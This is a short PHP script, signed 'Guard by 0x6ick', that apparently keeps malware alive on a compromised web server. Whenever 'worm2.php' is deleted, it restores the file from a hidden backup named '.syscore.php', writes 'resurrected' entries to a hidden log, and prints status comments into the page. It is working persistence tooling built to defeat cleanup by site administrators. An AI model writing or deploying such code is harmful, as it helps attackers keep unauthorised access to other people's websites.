<?php
//Guard by 0x6ick
$_main = 'worm2.php';          
$_backup = '.syscore.php';    
$_log = '.reslog';         

if (!file_exists($_main)) {
    if (file_exists($_backup)) {
        copy($_backup, $_main);

        //timestamp
        $t = date("Y-m-d H:i:s");
        file_put_contents($_log, "[+] $_main resurrected at $t\n", FILE_APPEND);

        
        echo "<!-- Resurrection complete -->";
    }
} else {
   
    echo "<!-- Alive -->";
}
?>
